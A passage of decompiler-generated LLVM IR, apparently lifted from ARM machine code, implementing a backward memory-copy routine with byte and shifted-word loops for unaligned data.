  %v2_17698 = phi i32 [ %v11_17684, %.thread8 ], [ %v0_1773020, %.thread14 ], [ %v7_17684, %dec_label_pc_17674 ], [ %v2_17608, %dec_label_pc_17604 ], [ %v2_176a453, %dec_label_pc_17838 ], [ %v2_176a452, %dec_label_pc_177cc ], [ %v2_176a451, %dec_label_pc_17760 ], [ %v7_1768c, %bb149 ]
  %v0_17694 = phi i32 [ %v0_17694.pre, %.thread8 ], [ %v2_176d8, %.thread14 ], [ %v2_17674, %dec_label_pc_17674 ], [ %v2_1760c, %dec_label_pc_17604 ], [ %v0_1769449, %dec_label_pc_17838 ], [ %v0_1769448, %dec_label_pc_177cc ], [ %v0_1769447, %dec_label_pc_17760 ], [ %v7_17690, %bb149 ]
  %v1_17694 = add i32 %v0_17694, 4
  store i32 %v1_17694, i32* %r2.global-to-local, align 4
  %v3_17694 = sub i32 0, %v0_17694
  %v4_17694 = and i32 %v1_17694, %v3_17694
  %v5_17694 = icmp slt i32 %v4_17694, 0
  store i1 %v5_17694, i1* %cpsr_v.global-to-local, align 1
  %v6_17694 = icmp slt i32 %v1_17694, 0
  store i1 %v6_17694, i1* %cpsr_n.global-to-local, align 1
  %v7_17694 = icmp eq i32 %v1_17694, 0
  store i1 %v7_17694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17694, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1769c = add i32 %v0_17694, 2
  %v3_1769c = sub i32 -3, %v0_17694
  %v4_1769c = and i32 %v3_1769c, %v1_17694
  %v5_1769c = icmp slt i32 %v4_1769c, 0
  store i1 %v5_1769c, i1* %cpsr_v.global-to-local, align 1
  %v6_1769c = icmp slt i32 %v1_1769c, 0
  store i1 %v6_1769c, i1* %cpsr_n.global-to-local, align 1
  %v7_1769c = icmp eq i32 %v1_17694, 2
  store i1 %v7_1769c, i1* %cpsr_z.global-to-local, align 1
  %v0_176a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_176a0 = add i32 %v0_176a0, -1
  %v2_176a0 = inttoptr i32 %v1_176a0 to i8*
  %v3_176a0 = load i8, i8* %v2_176a0, align 1
  %v4_176a0 = zext i8 %v3_176a0 to i32
  store i32 %v4_176a0, i32* @r3, align 4
  store i32 %v1_176a0, i32* %r1.global-to-local, align 4
  %v3_176a4 = add i32 %v2_17698, -1
  %v4_176a4 = inttoptr i32 %v3_176a4 to i8*
  store i8 %v3_176a0, i8* %v4_176a4, align 1
  %v5_176a4 = load i32, i32* %r0.global-to-local, align 4
  %v6_176a4 = add i32 %v5_176a4, -1
  store i32 %v6_176a4, i32* %r0.global-to-local, align 4
  %v0_176a8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_176a8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_176a8 = xor i1 %v0_176a8, %v1_176a8
  br i1 %v2_176a8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_176a8 = load i32, i32* %r1.global-to-local, align 4
  %v4_176a8 = add i32 %v3_176a8, -1
  %v5_176a8 = inttoptr i32 %v4_176a8 to i8*
  %v6_176a8 = load i8, i8* %v5_176a8, align 1
  %v7_176a8 = zext i8 %v6_176a8 to i32
  store i32 %v7_176a8, i32* @r3, align 4
  store i32 %v4_176a8, i32* %r1.global-to-local, align 4
  %v6_176ac = add i32 %v5_176a4, -2
  %v7_176ac = inttoptr i32 %v6_176ac to i8*
  store i8 %v6_176a8, i8* %v7_176ac, align 1
  %v8_176ac = load i32, i32* %r0.global-to-local, align 4
  %v9_176ac = add i32 %v8_176ac, -1
  store i32 %v9_176ac, i32* %r0.global-to-local, align 4
  %v1_176b0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_176b0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_176b4 = phi i32 [ %v9_176ac, %bb152 ], [ %v6_176a4, %bb151 ]
  %v2_176b4 = phi i1 [ %v2_176b0.pre, %bb152 ], [ %v1_176a8, %bb151 ]
  %v1_176b4 = phi i1 [ %v1_176b0.pre, %bb152 ], [ %v0_176a8, %bb151 ]
  %v0_176b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_176b0 = xor i1 %v2_176b4, %v1_176b4
  %v4_176b0 = or i1 %v0_176b0, %v3_176b0
  br i1 %v4_176b0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_176b0 = load i32, i32* %r1.global-to-local, align 4
  %v6_176b0 = add i32 %v5_176b0, -1
  %v7_176b0 = inttoptr i32 %v6_176b0 to i8*
  %v8_176b0 = load i8, i8* %v7_176b0, align 1
  %v9_176b0 = zext i8 %v8_176b0 to i32
  store i32 %v9_176b0, i32* @r3, align 4
  store i32 %v6_176b0, i32* %r1.global-to-local, align 4
  %v8_176b4 = add i32 %v7_176b4, -1
  %v9_176b4 = inttoptr i32 %v8_176b4 to i8*
  store i8 %v8_176b0, i8* %v9_176b4, align 1
  %v10_176b4 = load i32, i32* %r0.global-to-local, align 4
  %v11_176b4 = add i32 %v10_176b4, -1
  store i32 %v11_176b4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_176bc:                               ; preds = %dec_label_pc_17614
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_176bc = icmp eq i32 %v1_17614, 1
  store i1 %v8_176bc, i1* %cpsr_n.global-to-local, align 1
  %v9_176bc = icmp eq i32 %v1_17614, 2
  store i1 %v9_176bc, i1* %cpsr_z.global-to-local, align 1
  %v1_176c0 = add i32 %v2_17604, -1
  %v2_176c0 = inttoptr i32 %v1_176c0 to i8*
  %v3_176c0 = load i8, i8* %v2_176c0, align 1
  %v4_176c0 = zext i8 %v3_176c0 to i32
  store i32 %v4_176c0, i32* @r3, align 4
  store i32 %v1_176c0, i32* %r1.global-to-local, align 4
  %v3_176c4 = add i32 %v2_17608, -1
  %v4_176c4 = inttoptr i32 %v3_176c4 to i8*
  store i8 %v3_176c0, i8* %v4_176c4, align 1
  %v5_176c4 = load i32, i32* %r0.global-to-local, align 4
  %v6_176c4 = add i32 %v5_176c4, -1
  store i32 %v6_176c4, i32* %r0.global-to-local, align 4
  br i1 %v8_176bc, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_176bc
  %v6_176c8 = load i32, i32* %r1.global-to-local, align 4
  %v7_176c8 = add i32 %v6_176c8, -1
  %v8_176c8 = inttoptr i32 %v7_176c8 to i8*
  %v9_176c8 = load i8, i8* %v8_176c8, align 1
  %v10_176c8 = zext i8 %v9_176c8 to i32
  store i32 %v10_176c8, i32* @r3, align 4
  store i32 %v7_176c8, i32* %r1.global-to-local, align 4
  %v9_176cc = add i32 %v5_176c4, -2
  %v10_176cc = inttoptr i32 %v9_176cc to i8*
  store i8 %v9_176c8, i8* %v10_176cc, align 1
  %v11_176cc = load i32, i32* %r0.global-to-local, align 4
  %v12_176cc = add i32 %v11_176cc, -1
  store i32 %v12_176cc, i32* %r0.global-to-local, align 4
  br i1 %v9_176bc, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_176d0 = load i32, i32* %r1.global-to-local, align 4
  %v9_176d0 = add i32 %v8_176d0, -1
  %v10_176d0 = inttoptr i32 %v9_176d0 to i8*
  %v11_176d0 = load i8, i8* %v10_176d0, align 1
  %v12_176d0 = zext i8 %v11_176d0 to i32
  store i32 %v12_176d0, i32* @r3, align 4
  store i32 %v9_176d0, i32* %r1.global-to-local, align 4
  %v11_176d4 = add i32 %v11_176cc, -2
  %v12_176d4 = inttoptr i32 %v11_176d4 to i8*
  store i8 %v11_176d0, i8* %v12_176d4, align 1
  %v13_176d4 = load i32, i32* %r0.global-to-local, align 4
  %v14_176d4 = add i32 %v13_176d4, -1
  store i32 %v14_176d4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_176bc, %bb155
  %v0_1773020 = phi i32 [ %v12_176cc, %bb154 ], [ %v6_176c4, %dec_label_pc_176bc ], [ %v14_176d4, %bb155 ]
  %v0_176d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_176d8 = load i32, i32* @ip, align 4
  %v2_176d8 = sub i32 %v0_176d8, %v1_176d8
  store i32 %v2_176d8, i32* %r2.global-to-local, align 4
  %v4_176d8 = xor i32 %v1_176d8, %v0_176d8
  %v5_176d8 = xor i32 %v2_176d8, %v0_176d8
  %v6_176d8 = and i32 %v5_176d8, %v4_176d8
  %v7_176d8 = icmp slt i32 %v6_176d8, 0
  store i1 %v7_176d8, i1* %cpsr_v.global-to-local, align 1
  %v8_176d8 = icmp slt i32 %v2_176d8, 0
  store i1 %v8_176d8, i1* %cpsr_n.global-to-local, align 1
  %v9_176d8 = icmp eq i32 %v0_176d8, %v1_176d8
  store i1 %v9_176d8, i1* %cpsr_z.global-to-local, align 1
  %v5_176dc = icmp slt i32 %v0_176d8, %v1_176d8
  br i1 %v5_176dc, label %bb150, label %dec_label_pc_176e0

dec_label_pc_176e0:                               ; preds = %.thread14
  %v0_176e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_176e0 = urem i32 %v0_176e0, 4
  store i32 %v1_176e0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_176e0 = icmp eq i32 %v1_176e0, 0
  store i1 %v2_176e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_176e0, label %dec_label_pc_17624, label %dec_label_pc_176e8

dec_label_pc_176e8:                               ; preds = %dec_label_pc_1761c, %dec_label_pc_176e0
  %v0_1773019 = phi i32 [ %v2_17608, %dec_label_pc_1761c ], [ %v0_1773020, %dec_label_pc_176e0 ]
  %v0_177dc = phi i32 [ %v2_1760c, %dec_label_pc_1761c ], [ %v2_176d8, %dec_label_pc_176e0 ]
  %v0_176e8 = phi i32 [ %v2_17604, %dec_label_pc_1761c ], [ %v0_176e0, %dec_label_pc_176e0 ]
  %v0_176f0 = phi i32 [ %v1_1761c, %dec_label_pc_1761c ], [ %v1_176e0, %dec_label_pc_176e0 ]
  %v1_176e8 = and i32 %v0_176e8, -4
  store i32 %v1_176e8, i32* %r1.global-to-local, align 4
  %v1_176ec = inttoptr i32 %v1_176e8 to i32*
  %v2_176ec = load i32, i32* %v1_176ec, align 4
  store i32 %v2_176ec, i32* @r3, align 4
  %v7_176f0 = icmp ult i32 %v0_176f0, 2
  %v2_177d4 = add i32 %v0_177dc, -12
  %v4_177d4 = sub i32 11, %v0_177dc
  %v5_177d4 = and i32 %v4_177d4, %v0_177dc
  %v6_177d4 = icmp slt i32 %v5_177d4, 0
  store i1 %v6_177d4, i1* %cpsr_v.global-to-local, align 1
  %v7_177d4 = icmp slt i32 %v2_177d4, 0
  store i1 %v7_177d4, i1* %cpsr_n.global-to-local, align 1
  %v8_177d4 = icmp eq i32 %v0_177dc, 12
  store i1 %v8_177d4, i1* %cpsr_z.global-to-local, align 1
  %v5_177d8 = icmp slt i32 %v0_177dc, 12
  br i1 %v7_176f0, label %dec_label_pc_177d4, label %dec_label_pc_176f8

dec_label_pc_176f8:                               ; preds = %dec_label_pc_176e8
  %v8_176f0 = icmp eq i32 %v0_176f0, 2
  br i1 %v8_176f0, label %dec_label_pc_17768, label %dec_label_pc_176fc

dec_label_pc_176fc:                               ; preds = %dec_label_pc_176f8
  br i1 %v5_177d8, label %dec_label_pc_17748, label %dec_label_pc_17704

dec_label_pc_17704:                               ; preds = %dec_label_pc_176fc
  store i32 %v2_177d4, i32* %r2.global-to-local, align 4
  %v3_17708 = load i32, i32* @r4, align 4
  store i32 %v3_17708, i32* %stack_var_-12, align 4
  %v6_17708 = load i32, i32* @r5, align 4
  %v8_17708 = inttoptr i32 %v6_17708 to i8*
  store i8* %v8_17708, i8** %stack_var_-8, align 4
  %v11_17708 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1770c

dec_label_pc_1770c:                               ; preds = %dec_label_pc_1770c.dec_label_pc_1770c_crit_edge, %dec_label_pc_17704
  %v0_17730 = phi i32 [ %v1_17730, %dec_label_pc_1770c.dec_label_pc_1770c_crit_edge ], [ %v0_1773019, %dec_label_pc_17704 ]
  %v0_17710 = phi i32 [ %v0_17710.pre, %dec_label_pc_1770c.dec_label_pc_1770c_crit_edge ], [ %v1_176e8, %dec_label_pc_17704 ]
  %v0_1770c = phi i32 [ %v0_1770c.pre, %dec_label_pc_1770c.dec_label_pc_1770c_crit_edge ], [ %v2_176ec, %dec_label_pc_17704 ]
  %v3_1770c = mul i32 %v0_1770c, 256
  store i32 %v3_1770c, i32* %lr.global-to-local, align 4
  %v1_17710 = add i32 %v0_17710, -4
  %v2_17710 = inttoptr i32 %v1_17710 to i32*
  %v3_17710 = load i32, i32* %v2_17710, align 4
  store i32 %v3_17710, i32* @r3, align 4
  %v4_17710 = add i32 %v0_17710, -8
  %v5_17710 = inttoptr i32 %v4_17710 to i32*
  %v6_17710 = load i32, i32* %v5_17710, align 4
  store i32 %v6_17710, i32* %r4.global-to-local, align 4
  %v7_17710 = add i32 %v0_17710, -12
  %v8_17710 = inttoptr i32 %v7_17710 to i32*
  %v9_17710 = load i32, i32* %v8_17710, align 4
  store i32 %v9_17710, i32* %r5.global-to-local, align 4
  %v10_17710 = add i32 %v0_17710, -16
  %v11_17710 = inttoptr i32 %v10_17710 to i32*
  %v12_17710 = load i32, i32* %v11_17710, align 4
  store i32 %v10_17710, i32* %r1.global-to-local, align 4
  %v4_17714 = udiv i32 %v12_17710, 16777216
  %v5_17714 = or i32 %v4_17714, %v3_1770c
  store i32 %v5_17714, i32* %lr.global-to-local, align 4
  %v3_17718 = mul i32 %v12_17710, 256
  %v4_1771c = udiv i32 %v9_17710, 16777216
  %v5_1771c = or i32 %v3_17718, %v4_1771c
  store i32 %v5_1771c, i32* @ip, align 4
  %v3_17720 = mul i32 %v9_17710, 256
  %v4_17724 = udiv i32 %v6_17710, 16777216
  %v5_17724 = or i32 %v3_17720, %v4_17724
  store i32 %v5_17724, i32* %r5.global-to-local, align 4
  %v3_17728 = mul i32 %v6_17710, 256
  %v4_1772c = udiv i32 %v3_17710, 16777216
  %v5_1772c = or i32 %v3_17728, %v4_1772c
  store i32 %v5_1772c, i32* %r4.global-to-local, align 4
  %v1_17730 = add i32 %v0_17730, -16
  %v2_17730 = inttoptr i32 %v1_17730 to i32*
  store i32 %v5_1772c, i32* %v2_17730, align 4
  %v4_17730 = add i32 %v0_17730, -12
  %v5_17730 = inttoptr i32 %v4_17730 to i32*
  %v6_17730 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17730, i32* %v5_17730, align 4
  %v7_17730 = add i32 %v0_17730, -8
  %v8_17730 = inttoptr i32 %v7_17730 to i32*
  %v9_17730 = load i32, i32* @ip, align 4
  store i32 %v9_17730, i32* %v8_17730, align 4
  %v10_17730 = add i32 %v0_17730, -4
  %v11_17730 = inttoptr i32 %v10_17730 to i32*
  %v12_17730 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17730, i32* %v11_17730, align 4
  store i32 %v1_17730, i32* %r0.global-to-local, align 4
  %v0_17734 = load i32, i32* %r2.global-to-local, align 4
  %v2_17734 = add i32 %v0_17734, -16
  store i32 %v2_17734, i32* %r2.global-to-local, align 4
  %v6_17738 = icmp slt i32 %v0_17734, 16
  br i1 %v6_17738, label %dec_label_pc_1773c, label %dec_label_pc_1770c.dec_label_pc_1770c_crit_edge

dec_label_pc_1770c.dec_label_pc_1770c_crit_edge:  ; preds = %dec_label_pc_1770c
  %v0_1770c.pre = load i32, i32* @r3, align 4
  %v0_17710.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1770c

dec_label_pc_1773c:                               ; preds = %dec_label_pc_1770c
  %v2_1773c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1773c, i32* @r4, align 4
  %v5_1773c = load i8*, i8** %stack_var_-8, align 4
  %v6_1773c = ptrtoint i8* %v5_1773c to i32
  store i32 %v6_1773c, i32* @r5, align 4
  store i32 %v11_17708, i32* @lr, align 4
  %v2_17740 = add i32 %v0_17734, -4
  store i32 %v2_17740, i32* %r2.global-to-local, align 4
  %v4_17740 = add i32 %v0_17734, 2147483632
  %v5_17740 = and i32 %v2_17740, %v4_17740
  %v6_17740 = icmp slt i32 %v5_17740, 0
  store i1 %v6_17740, i1* %cpsr_v.global-to-local, align 1
  %v7_17740 = icmp slt i32 %v2_17740, 0
  store i1 %v7_17740, i1* %cpsr_n.global-to-local, align 1
  %v8_17740 = icmp eq i32 %v2_17740, 0
  store i1 %v8_17740, i1* %cpsr_z.global-to-local, align 1
  %v5_17744 = icmp slt i32 %v2_17734, -12
  br i1 %v5_17744, label %dec_label_pc_17760, label %dec_label_pc_17748

dec_label_pc_17748:                               ; preds = %dec_label_pc_1773c, %dec_label_pc_176fc, %dec_label_pc_17748
  %v1_17754 = phi i32 [ %v5_17754, %dec_label_pc_17748 ], [ %v1_17730, %dec_label_pc_1773c ], [ %v0_1773019, %dec_label_pc_176fc ]
  %v0_17748 = load i32, i32* @r3, align 4
  %v3_17748 = mul i32 %v0_17748, 256
  store i32 %v3_17748, i32* %ip.global-to-local, align 4
  %v0_1774c = load i32, i32* %r1.global-to-local, align 4
  %v1_1774c = add i32 %v0_1774c, -4
  %v2_1774c = inttoptr i32 %v1_1774c to i32*
  %v3_1774c = load i32, i32* %v2_1774c, align 4
  store i32 %v3_1774c, i32* @r3, align 4
  store i32 %v1_1774c, i32* %r1.global-to-local, align 4
  %v4_17750 = udiv i32 %v3_1774c, 16777216
  %v5_17750 = or i32 %v4_17750, %v3_17748
  store i32 %v5_17750, i32* @ip, align 4
  %v2_17754 = add i32 %v1_17754, -4
  %v3_17754 = inttoptr i32 %v2_17754 to i32*
  store i32 %v5_17750, i32* %v3_17754, align 4
  %v4_17754 = load i32, i32* %r0.global-to-local, align 4
  %v5_17754 = add i32 %v4_17754, -4
  store i32 %v5_17754, i32* %r0.global-to-local, align 4
  %v0_17758 = load i32, i32* %r2.global-to-local, align 4
  %v2_17758 = add i32 %v0_17758, -4
  store i32 %v2_17758, i32* %r2.global-to-local, align 4
  %v6_1775c = icmp slt i32 %v0_17758, 4
  br i1 %v6_1775c, label %dec_label_pc_17760.loopexit, label %dec_label_pc_17748

dec_label_pc_17760.loopexit:                      ; preds = %dec_label_pc_17748
  %v4_17758 = sub i32 3, %v0_17758
  %v5_17758 = and i32 %v4_17758, %v0_17758
  %v6_17758 = icmp slt i32 %v5_17758, 0
  %v7_17758 = icmp slt i32 %v2_17758, 0
  store i1 %v6_17758, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17758, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17760

dec_label_pc_17760:                               ; preds = %dec_label_pc_17760.loopexit, %dec_label_pc_1773c
  %v2_176a451 = phi i32 [ %v5_17754, %dec_label_pc_17760.loopexit ], [ %v1_17730, %dec_label_pc_1773c ]
  %v0_1769447 = phi i32 [ %v2_17758, %dec_label_pc_17760.loopexit ], [ %v2_17740, %dec_label_pc_1773c ]
  %v0_17760 = load i32, i32* %r1.global-to-local, align 4
  %v1_17760 = add i32 %v0_17760, 3
  store i32 %v1_17760, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17768:                               ; preds = %dec_label_pc_176f8
  br i1 %v5_177d8, label %dec_label_pc_177b4, label %dec_label_pc_17770

dec_label_pc_17770:                               ; preds = %dec_label_pc_17768
  store i32 %v2_177d4, i32* %r2.global-to-local, align 4
  %v3_17774 = load i32, i32* @r4, align 4
  store i32 %v3_17774, i32* %stack_var_-12, align 4
  %v6_17774 = load i32, i32* @r5, align 4
  %v8_17774 = inttoptr i32 %v6_17774 to i8*
  store i8* %v8_17774, i8** %stack_var_-8, align 4
  %v11_17774 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17778

dec_label_pc_17778:                               ; preds = %dec_label_pc_17778.dec_label_pc_17778_crit_edge, %dec_label_pc_17770
  %v0_1779c = phi i32 [ %v1_1779c, %dec_label_pc_17778.dec_label_pc_17778_crit_edge ], [ %v0_1773019, %dec_label_pc_17770 ]
  %v0_1777c = phi i32 [ %v0_1777c.pre, %dec_label_pc_17778.dec_label_pc_17778_crit_edge ], [ %v1_176e8, %dec_label_pc_17770 ]
  %v0_17778 = phi i32 [ %v0_17778.pre, %dec_label_pc_17778.dec_label_pc_17778_crit_edge ], [ %v2_176ec, %dec_label_pc_17770 ]
  %v3_17778 = mul i32 %v0_17778, 65536
  store i32 %v3_17778, i32* %lr.global-to-local, align 4
  %v1_1777c = add i32 %v0_1777c, -4
  %v2_1777c = inttoptr i32 %v1_1777c to i32*
  %v3_1777c = load i32, i32* %v2_1777c, align 4
  store i32 %v3_1777c, i32* @r3, align 4
  %v4_1777c = add i32 %v0_1777c, -8
  %v5_1777c = inttoptr i32 %v4_1777c to i32*
  %v6_1777c = load i32, i32* %v5_1777c, align 4
  store i32 %v6_1777c, i32* %r4.global-to-local, align 4
  %v7_1777c = add i32 %v0_1777c, -12
  %v8_1777c = inttoptr i32 %v7_1777c to i32*
  %v9_1777c = load i32, i32* %v8_1777c, align 4
  store i32 %v9_1777c, i32* %r5.global-to-local, align 4
  %v10_1777c = add i32 %v0_1777c, -16
  %v11_1777c = inttoptr i32 %v10_1777c to i32*
  %v12_1777c = load i32, i32* %v11_1777c, align 4
  store i32 %v10_1777c, i32* %r1.global-to-local, align 4
  %v4_17780 = udiv i32 %v12_1777c, 65536
  %v5_17780 = or i32 %v4_17780, %v3_17778
  store i32 %v5_17780, i32* %lr.global-to-local, align 4
  %v3_17784 = mul i32 %v12_1777c, 65536
  %v4_17788 = udiv i32 %v9_1777c, 65536
  %v5_17788 = or i32 %v3_17784, %v4_17788
  store i32 %v5_17788, i32* @ip, align 4
  %v3_1778c = mul i32 %v9_1777c, 65536
  %v4_17790 = udiv i32 %v6_1777c, 65536
  %v5_17790 = or i32 %v3_1778c, %v4_17790
  store i32 %v5_17790, i32* %r5.global-to-local, align 4
  %v3_17794 = mul i32 %v6_1777c, 65536
  %v4_17798 = udiv i32 %v3_1777c, 65536
  %v5_17798 = or i32 %v3_17794, %v4_17798
  store i32 %v5_17798, i32* %r4.global-to-local, align 4
  %v1_1779c = add i32 %v0_1779c, -16
  %v2_1779c = inttoptr i32 %v1_1779c to i32*
  store i32 %v5_17798, i32* %v2_1779c, align 4
  %v4_1779c = add i32 %v0_1779c, -12
  %v5_1779c = inttoptr i32 %v4_1779c to i32*
  %v6_1779c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1779c, i32* %v5_1779c, align 4
  %v7_1779c = add i32 %v0_1779c, -8
  %v8_1779c = inttoptr i32 %v7_1779c to i32*
  %v9_1779c = load i32, i32* @ip, align 4
  store i32 %v9_1779c, i32* %v8_1779c, align 4
  %v10_1779c = add i32 %v0_1779c, -4
  %v11_1779c = inttoptr i32 %v10_1779c to i32*
  %v12_1779c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1779c, i32* %v11_1779c, align 4
  store i32 %v1_1779c, i32* %r0.global-to-local, align 4
  %v0_177a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_177a0 = add i32 %v0_177a0, -16
  store i32 %v2_177a0, i32* %r2.global-to-local, align 4
  %v6_177a4 = icmp slt i32 %v0_177a0, 16
  br i1 %v6_177a4, label %dec_label_pc_177a8, label %dec_label_pc_17778.dec_label_pc_17778_crit_edge

dec_label_pc_17778.dec_label_pc_17778_crit_edge:  ; preds = %dec_label_pc_17778
  %v0_17778.pre = load i32, i32* @r3, align 4
  %v0_1777c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17778

dec_label_pc_177a8:                               ; preds = %dec_label_pc_17778
  %v2_177a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_177a8, i32* @r4, align 4
  %v5_177a8 = load i8*, i8** %stack_var_-8, align 4
  %v6_177a8 = ptrtoint i8* %v5_177a8 to i32
  store i32 %v6_177a8, i32* @r5, align 4
  store i32 %v11_17774, i32* @lr, align 4
  %v2_177ac = add i32 %v0_177a0, -4
  store i32 %v2_177ac, i32* %r2.global-to-local, align 4
  %v4_177ac = add i32 %v0_177a0, 2147483632
  %v5_177ac = and i32 %v2_177ac, %v4_177ac
  %v6_177ac = icmp slt i32 %v5_177ac, 0
  store i1 %v6_177ac, i1* %cpsr_v.global-to-local, align 1
  %v7_177ac = icmp slt i32 %v2_177ac, 0
  store i1 %v7_177ac, i1* %cpsr_n.global-to-local, align 1
  %v8_177ac = icmp eq i32 %v2_177ac, 0
  store i1 %v8_177ac, i1* %cpsr_z.global-to-local, align 1
  %v5_177b0 = icmp slt i32 %v2_177a0, -12
  br i1 %v5_177b0, label %dec_label_pc_177cc, label %dec_label_pc_177b4

dec_label_pc_177b4:                               ; preds = %dec_label_pc_177a8, %dec_label_pc_17768, %dec_label_pc_177b4
  %v1_177c0 = phi i32 [ %v5_177c0, %dec_label_pc_177b4 ], [ %v1_1779c, %dec_label_pc_177a8 ], [ %v0_1773019, %dec_label_pc_17768 ]
  %v0_177b4 = load i32, i32* @r3, align 4
  %v3_177b4 = mul i32 %v0_177b4, 65536
  store i32 %v3_177b4, i32* %ip.global-to-local, align 4
  %v0_177b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_177b8 = add i32 %v0_177b8, -4
  %v2_177b8 = inttoptr i32 %v1_177b8 to i32*
  %v3_177b8 = load i32, i32* %v2_177b8, align 4
  store i32 %v3_177b8, i32* @r3, align 4
  store i32 %v1_177b8, i32* %r1.global-to-local, align 4
  %v4_177bc = udiv i32 %v3_177b8, 65536
  %v5_177bc = or i32 %v4_177bc, %v3_177b4
  store i32 %v5_177bc, i32* @ip, align 4
  %v2_177c0 = add i32 %v1_177c0, -4
  %v3_177c0 = inttoptr i32 %v2_177c0 to i32*
  store i32 %v5_177bc, i32* %v3_177c0, align 4
  %v4_177c0 = load i32, i32* %r0.global-to-local, align 4
  %v5_177c0 = add i32 %v4_177c0, -4
  store i32 %v5_177c0, i32* %r0.global-to-local, align 4
  %v0_177c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_177c4 = add i32 %v0_177c4, -4
  store i32 %v2_177c4, i32* %r2.global-to-local, align 4
  %v6_177c8 = icmp slt i32 %v0_177c4, 4
  br i1 %v6_177c8, label %dec_label_pc_177cc.loopexit, label %dec_label_pc_177b4

dec_label_pc_177cc.loopexit:                      ; preds = %dec_label_pc_177b4
  %v4_177c4 = sub i32 3, %v0_177c4
  %v5_177c4 = and i32 %v4_177c4, %v0_177c4
  %v6_177c4 = icmp slt i32 %v5_177c4, 0
  %v7_177c4 = icmp slt i32 %v2_177c4, 0
  store i1 %v6_177c4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_177c4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_177cc

dec_label_pc_177cc:                               ; preds = %dec_label_pc_177cc.loopexit, %dec_label_pc_177a8
  %v2_176a452 = phi i32 [ %v5_177c0, %dec_label_pc_177cc.loopexit ], [ %v1_1779c, %dec_label_pc_177a8 ]
  %v0_1769448 = phi i32 [ %v2_177c4, %dec_label_pc_177cc.loopexit ], [ %v2_177ac, %dec_label_pc_177a8 ]
  %v0_177cc = load i32, i32* %r1.global-to-local, align 4
  %v1_177cc = add i32 %v0_177cc, 2
  store i32 %v1_177cc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_177d4:                               ; preds = %dec_label_pc_176e8
  br i1 %v5_177d8, label %dec_label_pc_17820, label %dec_label_pc_177dc

dec_label_pc_177dc:                               ; preds = %dec_label_pc_177d4
  store i32 %v2_177d4, i32* %r2.global-to-local, align 4
  %v3_177e0 = load i32, i32* @r4, align 4
  store i32 %v3_177e0, i32* %stack_var_-12, align 4
  %v6_177e0 = load i32, i32* @r5, align 4
  %v8_177e0 = inttoptr i32 %v6_177e0 to i8*
  store i8* %v8_177e0, i8** %stack_var_-8, align 4
  %v11_177e0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_177e4

dec_label_pc_177e4:                               ; preds = %dec_label_pc_177e4.dec_label_pc_177e4_crit_edge, %dec_label_pc_177dc
  %v0_17808 = phi i32 [ %v1_17808, %dec_label_pc_177e4.dec_label_pc_177e4_crit_edge ], [ %v0_1773019, %dec_label_pc_177dc ]
  %v0_177e8 = phi i32 [ %v0_177e8.pre, %dec_label_pc_177e4.dec_label_pc_177e4_crit_edge ], [ %v1_176e8, %dec_label_pc_177dc ]
  %v0_177e4 = phi i32 [ %v0_177e4.pre, %dec_label_pc_177e4.dec_label_pc_177e4_crit_edge ], [ %v2_176ec, %dec_label_pc_177dc ]
  %v3_177e4 = mul i32 %v0_177e4, 16777216
  store i32 %v3_177e4, i32* %lr.global-to-local, align 4
  %v1_177e8 = add i32 %v0_177e8, -4
  %v2_177e8 = inttoptr i32 %v1_177e8 to i32*
  %v3_177e8 = load i32, i32* %v2_177e8, align 4
  store i32 %v3_177e8, i32* @r3, align 4
  %v4_177e8 = add i32 %v0_177e8, -8
  %v5_177e8 = inttoptr i32 %v4_177e8 to i32*
  %v6_177e8 = load i32, i32* %v5_177e8, align 4
  store i32 %v6_177e8, i32* %r4.global-to-local, align 4
  %v7_177e8 = add i32 %v0_177e8, -12
  %v8_177e8 = inttoptr i32 %v7_177e8 to i32*
  %v9_177e8 = load i32, i32* %v8_177e8, align 4
  store i32 %v9_177e8, i32* %r5.global-to-local, align 4
  %v10_177e8 = add i32 %v0_177e8, -16
  %v11_177e8 = inttoptr i32 %v10_177e8 to i32*
  %v12_177e8 = load i32, i32* %v11_177e8, align 4
